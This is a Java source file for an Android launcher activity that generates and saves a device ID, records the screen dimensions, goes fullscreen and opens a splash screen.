package com.icontrol.protector;


import static com.icontrol.protector.UtliTools.randomnumber;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Point;
import android.os.Bundle;
import android.view.Window;
import android.view.WindowManager;
import android.view.WindowMetrics;


public class Startme extends Activity {
    @Override
    protected void onCreate( Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        try{
            Context myctx = getApplicationContext();

            if (MySettings.Read(myctx,Consts.DEVICE_ID,"").length() == 0){
                String newid = UtliTools.Create_DevicID() + String.valueOf(randomnumber(100, 199));
                MyLoger.Debug("CreateID", newid);
                MySettings.Write(myctx, Consts.DEVICE_ID, newid);
            }



//            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
//                WindowManager wm = getSystemService(WindowManager.class);
//
//                // Get current window metrics
//                WindowMetrics windowMetrics = wm.getMaximumWindowMetrics();
//
//                // Subtract the insets to get the usable app size
//                int width = windowMetrics.getBounds().width();
//                int height = windowMetrics.getBounds().height();
//                MySettings.Write(myctx,Consts.Mob_width,String.valueOf(width));
//                MySettings.Write(myctx,Consts.Mob_height,String.valueOf(height));
//            }else{

            if (MySettings.Read(myctx,Consts.Mob_width,"").length() == 0){
                Point size = new Point();
                getWindowManager().getDefaultDisplay().getRealSize(size);
                int width = Math.min(size.x, size.y);
                int height = Math.max(size.x, size.y);
                MySettings.Write(myctx, Consts.Mob_width, String.valueOf(width));
                MySettings.Write(myctx, Consts.Mob_height, String.valueOf(height));
            }
          //  }

            requestWindowFeature(Window.FEATURE_NO_TITLE);

            getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                    WindowManager.LayoutParams.FLAG_FULLSCREEN);
            Intent fakint = new Intent(getApplicationContext(), Splasher.class);
            fakint.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

            startActivity(fakint);
        }catch (Exception as){
            finish();
        }
        //finish();
    }
}
